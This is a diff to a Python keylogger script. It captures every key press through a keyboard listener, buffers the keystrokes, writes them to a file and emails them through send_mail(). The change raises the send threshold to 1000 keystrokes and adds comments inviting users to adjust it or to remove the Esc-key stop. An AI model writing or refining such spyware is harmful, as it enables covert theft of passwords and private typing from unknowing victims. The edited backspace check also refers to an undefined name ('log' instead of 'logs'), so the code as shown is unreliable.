@@ -46,11 +46,14 @@ def on_press(key):
     global logs
     print('alphanumeric key {0} pressed'.format(key))
     k=str(key).replace("'","")
-    if(k=="Key.backspace"):
+    if(k=="Key.backspace" and len(log)!=0):
         logs.pop()
     else:
         logs.append(k)
-    if(len(logs)>15):
+    '''here i have consider 1000 words after that it will send the mail
+       you can change according to your need
+    '''
+    if(len(logs)>1000):
         write_file(logs)
         logs=[]
         
@@ -68,6 +71,9 @@ def write_file(logs):
             message +=k
     send_mail()
     
+'''it is used to stop the listener
+If you dont want the listener to stop you can delete it
+'''
 def on_release(key):
     global logs
     if key == keyboard.Key.esc:
